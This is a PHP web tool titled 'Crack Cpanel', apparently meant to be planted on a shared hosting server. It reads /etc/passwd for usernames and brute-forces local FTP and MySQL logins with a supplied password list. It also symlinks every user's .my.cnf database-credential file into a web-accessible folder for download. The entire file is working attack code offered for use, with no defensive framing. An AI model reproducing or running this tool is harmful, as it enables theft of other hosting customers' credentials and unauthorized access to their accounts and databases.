<html>
<head>
	
<title>Cpanel</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<style> 
body {
    background: url("http://store1.up-00.com/2016-05/1463179098221.jpg");
    background-size: 1500px 1300px;
    background-repeat: no-repeat;
    padding-top: 40px;
}
</style>

<body  text="white" >

<?php

///:\/*[a-zA-Z0-9,-]*(...)*[a-z]*/

error_reporting(0);

echo "<center><center><h2><font color='blue' />Crack Cpanel V 0.7.3</h2></center></center>";
$a = fopen("/etc/passwd","r");
$read = fread($a, filesize("/etc/passwd"));
fclose($a);

$ok = 0;



$username = preg_replace("/:\/*[a-zA-Z0-9,-]*(...)*[a-z]*/","", $read);
$username1 = explode("\n",$username);


$case =  "
<center><center><form action='cpanel.php' method='post' >
<select name='way'>
<option value='Cpanel'> Cpanel</option>
<option value='FTP'> FTP</option>
<option value='My_Cnf'> My_Cnf</option>
</select>
</from></center></center>
";

echo $case;

$selectOption = $_POST['way'];


switch ($selectOption) {
	
	case "Cpanel":
echo $brute;
	break;

	case "FTP":


if(isset($_POST['password']));

$a2 = explode("\r\n",$_POST['password']);


foreach ($username1 as $username2 ){

foreach ($a2 as $password1) {

if(isset($_POST['dump'])){
$ip = ftp_connect("127.0.0.1");
	if(ftp_login($ip, $username2, $password1))
	{

echo "<font bgcolor=black color=white>username is ===> (<b><font bgcolor=black color=red>$username2</font></b>) Password is ===> (<b><font color=red>$password1</font></b>)<br />";
$ok++;
echo "<hr><b>You Found <font color=red>$ok</font> FTP By w0lgix</b>\n";


		}

	  		}

	 			}

					}


	break;

case "My_Cnf":
	
$pass33 = fopen("/etc/passwd","r");
$read4 = fread($pass33, filesize("/etc/passwd"));
fclose($pass33);
$username4 = preg_replace("/:\/*[a-zA-Z0-9,-]*(...)*[a-z]*/","", $read4);
$username14 = explode("\n",$username4);

foreach ($username14 as $key4) {
	# code...

		mkdir('cpanel');
		$path = getcwd();
		@symlink('/home/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/var/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/var/www/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/home1/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/home2/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/home3/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/home4/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/home5/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/home6/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
		@symlink('/var/www/html/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
							
	}	

echo "<script>alert('Dumped!')</script>";

$path2 = dirname($_SERVER['PHP_SELF']);
$link = "<a href=$path2/cpanel target='_blank'><font color='red'>Link Here:~)</font></a>";
echo $link;
die();
	break;

}




$pass = "
<center><center>
<form  method='post'  >
<textarea rows=15 cols=70 size=88 name='password' >
</textarea>
<br ><br ><input type='submit' value='Crack' name='dump'/>
</form></center></center>
";

$brute =  "
<center><center>
<form  method='post'>
<textarea rows=15 cols=70 size=88888  >
$username
</textarea>
<br ><br >
";
if(isset($_POST['password']));

$a2 = explode("\r\n",$_POST['password']);


foreach ($username1 as $username2 ){

foreach ($a2 as $password1) {

if(isset($_POST['dump'])){

	if(@mysql_connect('localhost',$username2,$password1)){

echo "<font bgcolor=black color=white>username is ===> (<b><font bgcolor=black color=red>$username2</font></b>) Password is ===> (<b><font color=red>$password1</font></b>)<br />";
$ok++;
echo "<hr><b>You Found <font color=red>$ok</font> Cpanel By w0lgix</b>\n";


		}

	  		}

	 			}

					}



echo $brute;
echo $pass;
//#@345cc6mvw5FTDJx=B#Dfgt56
//#1234S$%bdu+S+ERF-12#$@@tui#
?>

</body>


</html>

